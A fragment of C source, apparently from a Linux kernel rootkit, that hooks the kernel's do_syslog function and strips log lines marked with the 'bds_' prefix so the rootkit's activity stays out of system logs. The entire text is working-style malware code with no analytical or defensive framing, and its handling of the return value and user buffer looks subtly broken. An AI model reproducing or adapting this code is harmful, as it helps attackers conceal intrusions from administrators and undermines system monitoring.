int (*orig_do_syslog)(int type, char __user *buf, int count, int source);

int rk_do_syslog(int type, char __user *buf, int len, int source) {
	int err = orig_do_syslog(type, buf, len, source);
	int ret = strlen(buf);
	if (file_check_prefix_suffix(buf, ret, "bds_" , "\n") == 1)
		ret = hide_file_content(buf, ret, "bds_" , "\n" );
	return ret;
}